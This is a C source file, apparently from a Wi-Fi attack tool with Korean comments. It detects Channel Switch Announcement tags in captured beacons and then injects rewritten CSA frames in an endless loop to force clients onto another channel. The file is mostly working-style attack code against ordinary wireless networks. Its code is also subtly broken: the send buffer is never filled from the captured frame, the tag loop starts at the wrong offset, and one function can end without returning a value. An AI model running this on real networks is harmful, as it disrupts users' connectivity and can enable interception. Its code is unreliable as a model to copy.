#include "csa.h"
#include "dot11.h"
#include "channel_hopper.h"
#include <unistd.h>


#define CSA_TAG_NUM 0x25
#define FRAME_LEN 24
#define FIXED_PARA_LEN 12

bool isCSA(const u_char *packet, int caplen, int csaCh)
{
    u_char *packet_;
    packet_ = (u_char *)packet;
    Radio *rad = (Radio *)packet_;
    int taglen = caplen - rad->hdr_len - FRAME_LEN - FIXED_PARA_LEN - 4;
    if (isBeacon(packet_))
    {

        packet_ += rad->hdr_len;
        packet_ += FRAME_LEN;
        packet_ += FIXED_PARA_LEN;
        for (int i = 0; i < taglen;)
        {
            Tag *tag = (Tag *)(packet_ + i);
            if (tag->tag_number == CSA_TAG_NUM)
            {
                printf("taglen : %d\n", taglen);
                return true;
            }
            i += tag->tag_length + 2;
        }
        return false;
    }
}

void sendCSA(pcap_t *pcap, const u_char *packet, int ChangeCh, unsigned char *Interface, int csaCh, int caplen)
{
    /* CSA 패킷을 전달했다고 가정
    1. CSA의 채널로 변경
    2. 변경한 채널에서 다시 CSA 전송
    */
    channel_hopping(Interface, csaCh); // CSA가 날린 채널로 이동
    u_char *send_packet;
    send_packet = (u_char *)malloc(sizeof(u_char) * (caplen - 4));
    *(send_packet + 16) = 0x00; // fcs

    Radio *rad = (Radio *)packet;
    int taglen = caplen - rad->hdr_len - FRAME_LEN - FIXED_PARA_LEN;
    Tag *tag = (Tag *)(packet + rad->hdr_len + FRAME_LEN + FIXED_PARA_LEN);

    for (int i = 0; i < taglen;)
    {
        Tag *tag = (Tag *)(send_packet + i);
        if (tag->tag_number == CSA_TAG_NUM)
        {
            *(send_packet + i + 3) = ChangeCh;
        }
        i += tag->tag_length + 2;
    }
    int packet_count = 0;
    while (1)
    {
        for (int i = 0; i < 4; i++)
        {

            printf("[%d] send packet !!! \n", ++packet_count);
            if (pcap_sendpacket(pcap, send_packet, caplen - 4) != 0)
            {
                fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
                exit(1);
            }
        }
        sleep(1);
    }
}